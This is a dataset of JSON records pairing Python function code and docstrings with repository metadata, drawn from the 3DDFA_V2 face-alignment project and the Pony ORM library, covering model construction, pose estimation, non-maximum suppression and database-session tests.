{"docstring": "\"\"\" Constructor\nArgs:\n    widen_factor: config of widen_factor\n    num_classes: number of classes\n\"\"\"\n", "func_signal": "def __init__(self, widen_factor=1.0, num_classes=1000, prelu=False, input_channel=3):\n", "code": "super(MobileNet, self).__init__()\n\nblock = DepthWiseBlock\nself.conv1 = nn.Conv2d(input_channel, int(32 * widen_factor), kernel_size=3, stride=2, padding=1,\n                       bias=False)\n\nself.bn1 = nn.BatchNorm2d(int(32 * widen_factor))\nif prelu:\n    self.relu = nn.PReLU()\nelse:\n    self.relu = nn.ReLU(inplace=True)\n\nself.dw2_1 = block(32 * widen_factor, 64 * widen_factor, prelu=prelu)\nself.dw2_2 = block(64 * widen_factor, 128 * widen_factor, stride=2, prelu=prelu)\n\nself.dw3_1 = block(128 * widen_factor, 128 * widen_factor, prelu=prelu)\nself.dw3_2 = block(128 * widen_factor, 256 * widen_factor, stride=2, prelu=prelu)\n\nself.dw4_1 = block(256 * widen_factor, 256 * widen_factor, prelu=prelu)\nself.dw4_2 = block(256 * widen_factor, 512 * widen_factor, stride=2, prelu=prelu)\n\nself.dw5_1 = block(512 * widen_factor, 512 * widen_factor, prelu=prelu)\nself.dw5_2 = block(512 * widen_factor, 512 * widen_factor, prelu=prelu)\nself.dw5_3 = block(512 * widen_factor, 512 * widen_factor, prelu=prelu)\nself.dw5_4 = block(512 * widen_factor, 512 * widen_factor, prelu=prelu)\nself.dw5_5 = block(512 * widen_factor, 512 * widen_factor, prelu=prelu)\nself.dw5_6 = block(512 * widen_factor, 1024 * widen_factor, stride=2, prelu=prelu)\n\nself.dw6 = block(1024 * widen_factor, 1024 * widen_factor, prelu=prelu)\n\nself.avgpool = nn.AdaptiveAvgPool2d(1)\nself.fc = nn.Linear(int(1024 * widen_factor), num_classes)\n\nfor m in self.modules():\n    if isinstance(m, nn.Conv2d):\n        n = m.kernel_size[0] * m.kernel_size[1] * m.out_channels\n        m.weight.data.normal_(0, math.sqrt(2. / n))\n    elif isinstance(m, nn.BatchNorm2d):\n        m.weight.data.fill_(1)\n        m.bias.data.zero_()", "path": "3DDFA_V2/models/mobilenet_v1.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"\nConstruct MobileNet.\nwiden_factor=1.0  for mobilenet_1\nwiden_factor=0.75 for mobilenet_075\nwiden_factor=0.5  for mobilenet_05\nwiden_factor=0.25 for mobilenet_025\n\"\"\"\n# widen_factor = 1.0, num_classes = 1000\n# model = MobileNet(widen_factor=widen_factor, num_classes=num_classes)\n# return model\n\n", "func_signal": "def mobilenet(**kwargs):\n", "code": "model = MobileNet(\n    widen_factor=kwargs.get('widen_factor', 1.0),\n    num_classes=kwargs.get('num_classes', 62)\n)\nreturn model", "path": "3DDFA_V2/models/mobilenet_v1.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\" Draw a 3D box as annotation of pose.\nRef:https://github.com/yinguobing/head-pose-estimation/blob/master/pose_estimator.py\nArgs:\n    img: the input image\n    P: (3, 4). Affine Camera Matrix.\n    kpt: (2, 68) or (3, 68)\n\"\"\"\n", "func_signal": "def plot_pose_box(img, P, ver, color=(40, 255, 0), line_width=2):\n", "code": "llength = calc_hypotenuse(ver)\npoint_3d = build_camera_box(llength)\n# Map to 2d image points\npoint_3d_homo = np.hstack((point_3d, np.ones([point_3d.shape[0], 1])))  # n x 4\npoint_2d = point_3d_homo.dot(P.T)[:, :2]\n\npoint_2d[:, 1] = - point_2d[:, 1]\npoint_2d[:, :2] = point_2d[:, :2] - np.mean(point_2d[:4, :2], 0) + np.mean(ver[:2, :27], 1)\npoint_2d = np.int32(point_2d.reshape(-1, 2))\n\n# Draw all the lines\ncv2.polylines(img, [point_2d], True, color, line_width, cv2.LINE_AA)\ncv2.line(img, tuple(point_2d[1]), tuple(\n    point_2d[6]), color, line_width, cv2.LINE_AA)\ncv2.line(img, tuple(point_2d[2]), tuple(\n    point_2d[7]), color, line_width, cv2.LINE_AA)\ncv2.line(img, tuple(point_2d[3]), tuple(\n    point_2d[8]), color, line_width, cv2.LINE_AA)\n\nreturn img", "path": "3DDFA_V2/utils/pose.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\" decompositing camera matrix P.\nArgs:\n    P: (3, 4). Affine Camera Matrix.\nReturns:\n    s: scale factor.\n    R: (3, 3). rotation matrix.\n    t2d: (2,). 2d translation.\n\"\"\"\n", "func_signal": "def P2sRt(P):\n", "code": "t3d = P[:, 3]\nR1 = P[0:1, :3]\nR2 = P[1:2, :3]\ns = (np.linalg.norm(R1) + np.linalg.norm(R2)) / 2.0\nr1 = R1 / np.linalg.norm(R1)\nr2 = R2 / np.linalg.norm(R2)\nr3 = np.cross(r1, r2)\n\nR = np.concatenate((r1, r2, r3), 0)\nreturn s, R, t3d", "path": "3DDFA_V2/utils/pose.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"matrix pose form\nparam: shape=(trans_dim+shape_dim+exp_dim,), i.e., 62 = 12 + 40 + 10\n\"\"\"\n\n# pre-defined templates for parameter\n", "func_signal": "def _parse_param(param):\n", "code": "n = param.shape[0]\nif n == 62:\n    trans_dim, shape_dim, exp_dim = 12, 40, 10\nelif n == 72:\n    trans_dim, shape_dim, exp_dim = 12, 40, 20\nelif n == 141:\n    trans_dim, shape_dim, exp_dim = 12, 100, 29\nelse:\n    raise Exception(f'Undefined templated param parsing rule')\n\nR_ = param[:trans_dim].reshape(3, -1)\nR = R_[:, :3]\noffset = R_[:, -1].reshape(3, 1)\nalpha_shp = param[trans_dim:trans_dim + shape_dim].reshape(-1, 1)\nalpha_exp = param[trans_dim + shape_dim:].reshape(-1, 1)\n\nreturn R, offset, alpha_shp, alpha_exp", "path": "3DDFA_V2/utils/tddfa_util.py", "commit_date": "2020-10-04 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"The main call of TDDFA, given image and box / landmark, return 3DMM params and roi_box\n:param img_ori: the input image\n:param objs: the list of box or landmarks\n:param kvs: options\n:return: param list and roi_box list\n\"\"\"\n# Crop image, forward to get the param\n", "func_signal": "def __call__(self, img_ori, objs, **kvs):\n", "code": "param_lst = []\nroi_box_lst = []\n\ncrop_policy = kvs.get('crop_policy', 'box')\nfor obj in objs:\n    if crop_policy == 'box':\n        # by face box\n        roi_box = parse_roi_box_from_bbox(obj)\n    elif crop_policy == 'landmark':\n        # by landmarks\n        roi_box = parse_roi_box_from_landmark(obj)\n    else:\n        raise ValueError(f'Unknown crop policy {crop_policy}')\n\n    roi_box_lst.append(roi_box)\n    img = crop_img(img_ori, roi_box)\n    img = cv2.resize(img, dsize=(self.size, self.size), interpolation=cv2.INTER_LINEAR)\n    inp = self.transform(img).unsqueeze(0)\n\n    if self.gpu_mode:\n        inp = inp.cuda(device=self.gpu_id)\n\n    if kvs.get('timer_flag', False):\n        end = time.time()\n        param = self.model(inp)\n        elapse = f'Inference: {(time.time() - end) * 1000:.1f}ms'\n        print(elapse)\n    else:\n        param = self.model(inp)\n\n    param = param.squeeze().cpu().numpy().flatten().astype(np.float32)\n    param = param * self.param_std + self.param_mean  # re-scale\n    # print('output', param)\n    param_lst.append(param)\n\nreturn param_lst, roi_box_lst", "path": "3DDFA_V2/TDDFA.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "# print(shape_dim, exp_dim)\n", "func_signal": "def convert_bfm_to_onnx(bfm_onnx_fp, shape_dim=40, exp_dim=10):\n", "code": "bfm_fp = bfm_onnx_fp.replace('.onnx', '.pkl')\nbfm_decoder = BFMModel_ONNX(bfm_fp=bfm_fp, shape_dim=shape_dim, exp_dim=exp_dim)\nbfm_decoder.eval()\n\n# dummy_input = torch.randn(12 + shape_dim + exp_dim)\ndummy_input = torch.randn(3, 3), torch.randn(3, 1), torch.randn(shape_dim, 1), torch.randn(exp_dim, 1)\nR, offset, alpha_shp, alpha_exp = dummy_input\ntorch.onnx.export(\n    bfm_decoder,\n    (R, offset, alpha_shp, alpha_exp),\n    bfm_onnx_fp,\n    input_names=['R', 'offset', 'alpha_shp', 'alpha_exp'],\n    output_names=['output'],\n    dynamic_axes={\n        'alpha_shp': [0],\n        'alpha_exp': [0],\n    },\n    do_constant_folding=True\n)\nprint(f'Convert {bfm_fp} to {bfm_onnx_fp} done.')", "path": "3DDFA_V2/bfm/bfm_onnx.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"Dispatch to either CPU or GPU NMS implementations.\"\"\"\n\n", "func_signal": "def nms(dets, thresh):\n", "code": "if dets.shape[0] == 0:\n    return []\nreturn cpu_nms(dets, thresh)\n# return gpu_nms(dets, thresh)", "path": "3DDFA_V2/FaceBoxes/utils/nms_wrapper.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "# nearest-neighbor sampling\n", "func_signal": "def get_colors(img, ver):\n", "code": "[h, w, _] = img.shape\nver[0, :] = np.minimum(np.maximum(ver[0, :], 0), w - 1)  # x\nver[1, :] = np.minimum(np.maximum(ver[1, :], 0), h - 1)  # y\nind = np.round(ver).astype(np.int32)\ncolors = img[ind[1, :], ind[0, :], :]  # n x 3\n\nreturn colors", "path": "3DDFA_V2/utils/uv.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"a.jpg -> jpg\"\"\"\n", "func_signal": "def _get_suffix(filename):\n", "code": "pos = filename.rfind('.')\nif pos == -1:\n    return ''\nreturn filename[pos + 1:]", "path": "3DDFA_V2/utils/io.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"Pure Python NMS baseline.\"\"\"\n", "func_signal": "def py_cpu_nms(dets, thresh):\n", "code": "x1 = dets[:, 0]\ny1 = dets[:, 1]\nx2 = dets[:, 2]\ny2 = dets[:, 3]\nscores = dets[:, 4]\n\nareas = (x2 - x1 + 1) * (y2 - y1 + 1)\norder = scores.argsort()[::-1]\n\nkeep = []\nwhile order.size > 0:\n    i = order[0]\n    keep.append(i)\n    xx1 = np.maximum(x1[i], x1[order[1:]])\n    yy1 = np.maximum(y1[i], y1[order[1:]])\n    xx2 = np.minimum(x2[i], x2[order[1:]])\n    yy2 = np.minimum(y2[i], y2[order[1:]])\n\n    w = np.maximum(0.0, xx2 - xx1 + 1)\n    h = np.maximum(0.0, yy2 - yy1 + 1)\n    inter = w * h\n    ovr = inter / (areas[i] + areas[order[1:]] - inter)\n\n    inds = np.where(ovr <= thresh)[0]\n    order = order[inds + 1]\n\nreturn keep", "path": "3DDFA_V2/FaceBoxes/utils/nms/py_cpu_nms.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "# weight initialization\n", "func_signal": "def _initialize_weights(self):\n", "code": "for m in self.modules():\n    if isinstance(m, nn.Conv2d):\n        nn.init.kaiming_normal_(m.weight, mode='fan_out')\n        if m.bias is not None:\n            nn.init.zeros_(m.bias)\n    elif isinstance(m, nn.BatchNorm2d):\n        nn.init.ones_(m.weight)\n        nn.init.zeros_(m.bias)\n    elif isinstance(m, nn.Linear):\n        nn.init.normal_(m.weight, 0, 0.01)\n        if m.bias is not None:\n            nn.init.zeros_(m.bias)", "path": "3DDFA_V2/models/mobilenet_v3.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"Draw landmarks using matplotlib\"\"\"\n", "func_signal": "def draw_landmarks(img, pts, style='fancy', wfp=None, show_flag=False, **kwargs):\n", "code": "height, width = img.shape[:2]\nplt.figure(figsize=(12, height / width * 12))\nplt.imshow(img[..., ::-1])\nplt.subplots_adjust(left=0, right=1, top=1, bottom=0)\nplt.axis('off')\n\ndense_flag = kwargs.get('dense_flag')\n\nif not type(pts) in [tuple, list]:\n    pts = [pts]\nfor i in range(len(pts)):\n    if dense_flag:\n        plt.plot(pts[i][0, ::6], pts[i][1, ::6], 'o', markersize=0.4, color='c', alpha=0.7)\n    else:\n        alpha = 0.8\n        markersize = 4\n        lw = 1.5\n        color = kwargs.get('color', 'w')\n        markeredgecolor = kwargs.get('markeredgecolor', 'black')\n\n        nums = [0, 17, 22, 27, 31, 36, 42, 48, 60, 68]\n\n        # close eyes and mouths\n        plot_close = lambda i1, i2: plt.plot([pts[i][0, i1], pts[i][0, i2]], [pts[i][1, i1], pts[i][1, i2]],\n                                             color=color, lw=lw, alpha=alpha - 0.1)\n        plot_close(41, 36)\n        plot_close(47, 42)\n        plot_close(59, 48)\n        plot_close(67, 60)\n\n        for ind in range(len(nums) - 1):\n            l, r = nums[ind], nums[ind + 1]\n            plt.plot(pts[i][0, l:r], pts[i][1, l:r], color=color, lw=lw, alpha=alpha - 0.1)\n\n            plt.plot(pts[i][0, l:r], pts[i][1, l:r], marker='o', linestyle='None', markersize=markersize,\n                     color=color,\n                     markeredgecolor=markeredgecolor, alpha=alpha)\nif wfp is not None:\n    plt.savefig(wfp, dpi=150)\n    print(f'Save visualization result to {wfp}')\n\nif show_flag:\n    plt.show()", "path": "3DDFA_V2/utils/functions.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"a.jpg -> jpg\"\"\"\n", "func_signal": "def get_suffix(filename):\n", "code": "pos = filename.rfind('.')\nif pos == -1:\n    return ''\nreturn filename[pos:]", "path": "3DDFA_V2/utils/functions.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "# Crop image, forward to get the param\n", "func_signal": "def __call__(self, img_ori, objs, **kvs):\n", "code": "param_lst = []\nroi_box_lst = []\n\ncrop_policy = kvs.get('crop_policy', 'box')\nfor obj in objs:\n    if crop_policy == 'box':\n        # by face box\n        roi_box = parse_roi_box_from_bbox(obj)\n    elif crop_policy == 'landmark':\n        # by landmarks\n        roi_box = parse_roi_box_from_landmark(obj)\n    else:\n        raise ValueError(f'Unknown crop policy {crop_policy}')\n\n    roi_box_lst.append(roi_box)\n    img = crop_img(img_ori, roi_box)\n    img = cv2.resize(img, dsize=(self.size, self.size), interpolation=cv2.INTER_LINEAR)\n    img = img.astype(np.float32).transpose(2, 0, 1)[np.newaxis, ...]\n    img = (img - 127.5) / 128.\n\n    inp_dct = {'input': img}\n\n    param = self.session.run(None, inp_dct)[0]\n    param = param.flatten().astype(np.float32)\n    param = param * self.param_std + self.param_mean  # re-scale\n    param_lst.append(param)\n\nreturn param_lst, roi_box_lst", "path": "3DDFA_V2/TDDFA_ONNX.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\"calc roi box from landmark\"\"\"\n", "func_signal": "def parse_roi_box_from_landmark(pts):\n", "code": "bbox = [min(pts[0, :]), min(pts[1, :]), max(pts[0, :]), max(pts[1, :])]\ncenter = [(bbox[0] + bbox[2]) / 2, (bbox[1] + bbox[3]) / 2]\nradius = max(bbox[2] - bbox[0], bbox[3] - bbox[1]) / 2\nbbox = [center[0] - radius, center[1] - radius, center[0] + radius, center[1] + radius]\n\nllength = sqrt((bbox[2] - bbox[0]) ** 2 + (bbox[3] - bbox[1]) ** 2)\ncenter_x = (bbox[2] + bbox[0]) / 2\ncenter_y = (bbox[3] + bbox[1]) / 2\n\nroi_box = [0] * 4\nroi_box[0] = center_x - llength / 2\nroi_box[1] = center_y - llength / 2\nroi_box[2] = roi_box[0] + llength\nroi_box[3] = roi_box[1] + llength\n\nreturn roi_box", "path": "3DDFA_V2/utils/functions.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "''' Old style model is stored with all names of parameters sharing common prefix 'module.' '''\n# print('remove prefix \\'{}\\''.format(prefix))\n", "func_signal": "def remove_prefix(state_dict, prefix):\n", "code": "f = lambda x: x.split(prefix, 1)[-1] if x.startswith(prefix) else x\nreturn {f(key): value for key, value in state_dict.items()}", "path": "3DDFA_V2/FaceBoxes/utils/functions.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "# torch.set_grad_enabled(False)\n\n# load onnx version of BFM\n", "func_signal": "def __init__(self, **kvs):\n", "code": "bfm_fp = kvs.get('bfm_fp', make_abs_path('configs/bfm_noneck_v3.pkl'))\nbfm_onnx_fp = bfm_fp.replace('.pkl', '.onnx')\nif not osp.exists(bfm_onnx_fp):\n    convert_bfm_to_onnx(\n        bfm_onnx_fp,\n        shape_dim=kvs.get('shape_dim', 40),\n        exp_dim=kvs.get('exp_dim', 10)\n    )\nself.bfm_session = onnxruntime.InferenceSession(bfm_onnx_fp, None)\n\n# load for optimization\nbfm = BFMModel(bfm_fp, shape_dim=kvs.get('shape_dim', 40), exp_dim=kvs.get('exp_dim', 10))\nself.tri = bfm.tri\nself.u_base, self.w_shp_base, self.w_exp_base = bfm.u_base, bfm.w_shp_base, bfm.w_exp_base\n\n# config\nself.gpu_mode = kvs.get('gpu_mode', False)\nself.gpu_id = kvs.get('gpu_id', 0)\nself.size = kvs.get('size', 120)\n\nparam_mean_std_fp = kvs.get(\n    'param_mean_std_fp', make_abs_path(f'configs/param_mean_std_62d_{self.size}x{self.size}.pkl')\n)\n\nonnx_fp = kvs.get('onnx_fp', kvs.get('checkpoint_fp').replace('.pth', '.onnx'))\n\n# convert to onnx online if not existed\nif onnx_fp is None or not osp.exists(onnx_fp):\n    print(f'{onnx_fp} does not exist, try to convert the `.pth` version to `.onnx` online')\n    onnx_fp = convert_to_onnx(**kvs)\n\nself.session = onnxruntime.InferenceSession(onnx_fp, None)\n\n# params normalization config\nr = _load(param_mean_std_fp)\nself.param_mean = r.get('mean')\nself.param_std = r.get('std')", "path": "3DDFA_V2/TDDFA_ONNX.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "\"\"\" compute three Euler angles from a Rotation Matrix. Ref: http://www.gregslabaugh.net/publications/euler.pdf\nrefined by: https://stackoverflow.com/questions/43364900/rotation-matrix-to-euler-angles-with-opencv\ntodo: check and debug\n Args:\n     R: (3,3). rotation matrix\n Returns:\n     x: yaw\n     y: pitch\n     z: roll\n \"\"\"\n", "func_signal": "def matrix2angle(R):\n", "code": "if R[2, 0] > 0.998:\n    z = 0\n    x = np.pi / 2\n    y = z + atan2(-R[0, 1], -R[0, 2])\nelif R[2, 0] < -0.998:\n    z = 0\n    x = -np.pi / 2\n    y = -z + atan2(R[0, 1], R[0, 2])\nelse:\n    x = asin(R[2, 0])\n    y = atan2(R[2, 1] / cos(x), R[2, 2] / cos(x))\n    z = atan2(R[1, 0] / cos(x), R[0, 0] / cos(x))\n\nreturn x, y, z", "path": "3DDFA_V2/utils/pose.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
{"docstring": "# Should rollback if the exception is not in the list of allowed_exceptions\n", "func_signal": "def test_db_session_manager_3(self):\n", "code": "try:\n    with db_session(allowed_exceptions=[TypeError]):\n        self.X(a=3, b=3)\n        1/0\nexcept ZeroDivisionError:\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# argument 'self' cannot be named 'database', because 'database' can be in kwargs\n", "func_signal": "def _bind(self, *args, **kwargs):\n", "code": "if self.provider is not None:\n    throw(BindingError, 'Database object was already bound to %s provider' % self.provider.dialect)\nif len(args) == 1 and not kwargs and hasattr(args[0], 'keys'):\n    args, kwargs = (), args[0]\nprovider = None\nif args: provider, args = args[0], args[1:]\nelif 'provider' not in kwargs: throw(TypeError, 'Database provider is not specified')\nelse: provider = kwargs.pop('provider')\nif isinstance(provider, type) and issubclass(provider, DBAPIProvider):\n    provider_cls = provider\nelse:\n    if not isinstance(provider, basestring):\n        throw(TypeError, 'Provider name should be string. Got: %r' % type(provider).__name__)\n    if provider == 'pygresql': throw(TypeError,\n        'Pony no longer supports PyGreSQL module. Please use psycopg2 instead.')\n    self.provider_name = provider\n    provider_module = import_module('pony.orm.dbproviders.' + provider)\n    provider_cls = provider_module.provider_cls\nkwargs['pony_call_on_connect'] = self.call_on_connect\nself.provider = provider_cls(*args, **kwargs)", "path": "pony/pony/orm/core.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should commit changes on exit from db_session\n", "func_signal": "def test_db_session_decorator_1(self):\n", "code": "@db_session\ndef test():\n    self.X(a=3, b=3)\ntest()\nwith db_session:\n    self.assertEqual(count(x for x in self.X), 3)", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# allowed_exceptions may be callable, should rollback if not nonzero\n", "func_signal": "def test_allowed_exceptions_2(self):\n", "code": "@db_session(allowed_exceptions=lambda e: isinstance(e, TypeError))\ndef test():\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# argument 'self' cannot be named 'database', because 'database' can be in kwargs\n", "func_signal": "def __init__(self, *args, **kwargs):\n", "code": "self.priority = 0\nself._insert_cache = {}\n\n# ER-diagram related stuff:\nself._translator_cache = {}\nself._constructed_sql_cache = {}\nself.entities = {}\nself.schema = None\nself.Entity = type.__new__(EntityMeta, 'Entity', (Entity,), {})\nself.Entity._database_ = self\n\n# Statistics-related stuff:\nself._global_stats = {}\nself._global_stats_lock = RLock()\nself._dblocal = DbLocal()\n\nself.on_connect = OnConnectDecorator(self, None)\nself._on_connect_funcs = []\nself.provider = self.provider_name = None\nif args or kwargs: self._bind(*args, **kwargs)", "path": "pony/pony/orm/core.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# query should not contain ORDER BY\n", "func_signal": "def test_select_first(self):\n", "code": "obj = select(p.info for p in Product).first()\nself.assertNotIn('order by', db.last_sql.lower())", "path": "pony/pony/orm/tests/test_json.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should not to do retry until retry count is specified\n", "func_signal": "def test_retry_3(self):\n", "code": "counter = count()\n@db_session(retry_exceptions=[ZeroDivisionError])\ndef test():\n    next(counter)\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    self.assertEqual(next(counter), 1)\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# todo: make sql_debug deprecated\n", "func_signal": "def sql_debug(value):\n", "code": "if not suppress_debug_change:\n    local.debug = value", "path": "pony/pony/orm/core.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should not retry if the exception not in the list of retry_exceptions\n", "func_signal": "def test_retry_6(self):\n", "code": "counter = count()\n@db_session(retry=3, retry_exceptions=[TypeError])\ndef test():\n    next(counter)\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    self.assertEqual(next(counter), 1)\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "\"\"\"\ndecorator(caller) converts a caller function into a decorator;\ndecorator(caller, func) decorates a function using a caller.\n\"\"\"\n", "func_signal": "def decorator(caller, func=None):\n", "code": "if func is not None: # returns a decorated function\n    if PY2:\n        evaldict = func.func_globals.copy()\n    else:\n        evaldict = func.__globals__.copy()\n    evaldict['_call_'] = caller\n    evaldict['_func_'] = func\n    return FunctionMaker.create(\n        func, \"return _call_(_func_, %(shortsignature)s)\",\n        evaldict, undecorated=func, __wrapped__=func)\nelse: # returns a decorator\n    if inspect.isclass(caller):\n        name = caller.__name__.lower()\n        callerfunc = get_init(caller)\n        doc = 'decorator(%s) converts functions/generators into ' \\\n            'factories of %s objects' % (caller.__name__, caller.__name__)\n        fun = getfullargspec(callerfunc).args[1] # second arg\n    elif inspect.isfunction(caller):\n        name = '_lambda_' if caller.__name__ == '<lambda>' \\\n            else caller.__name__\n        callerfunc = caller\n        doc = caller.__doc__\n        fun = getfullargspec(callerfunc).args[0] # first arg\n    else: # assume caller is an object with a __call__ method\n        name = caller.__class__.__name__.lower()\n        if PY2:\n            callerfunc = caller.__call__.im_func\n        else:\n            callerfunc = caller.__call__.__func__\n        doc = caller.__call__.__doc__\n        fun = getfullargspec(callerfunc).args[1] # second arg\n    if PY2:\n        evaldict = callerfunc.func_globals.copy()\n    else:\n        evaldict = callerfunc.__globals__.copy()\n    evaldict['_call_'] = caller\n    evaldict['decorator'] = decorator\n    return FunctionMaker.create(\n        '%s(%s)' % (name, fun), \n        'return decorator(_call_, %s)' % fun,\n        evaldict, undecorated=caller, __wrapped__=caller,\n        doc=doc, module=caller.__module__)", "path": "pony/pony/thirdparty/decorator.py", "commit_date": "2014-10-08 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Get the list of all products from the database\n", "func_signal": "def all_products():\n", "code": "products = select(p for p in Product)\nreturn template('''\n<h1>List of products</h1>\n<ul>\n%for p in products:\n    <li><a href=\"/products/{{ p.id }}/\">{{ p.name }}</a>\n%end\n</ul>\n''', products=products)", "path": "pony/pony/orm/examples/bottle_example.py", "commit_date": "2014-08-07 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# retry_exceptions may be callable, should retry if nonzero\n", "func_signal": "def test_retry_9(self):\n", "code": "counter = count()\n@db_session(retry=3, retry_exceptions=lambda e: isinstance(e, ZeroDivisionError))\ndef test():\n    i = next(counter)\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    self.assertEqual(next(counter), 4)\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# TODO: Add support for NVARCHAR2 and NCLOB datatypes\n", "func_signal": "def sql_type(converter):\n", "code": "if converter.max_len:\n    return 'VARCHAR2(%d CHAR)' % converter.max_len\nreturn 'CLOB'", "path": "pony/pony/orm/dbproviders/oracle.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should rollback changes if an exception is occurred\n", "func_signal": "def test_db_session_decorator_2(self):\n", "code": "@db_session\ndef test():\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
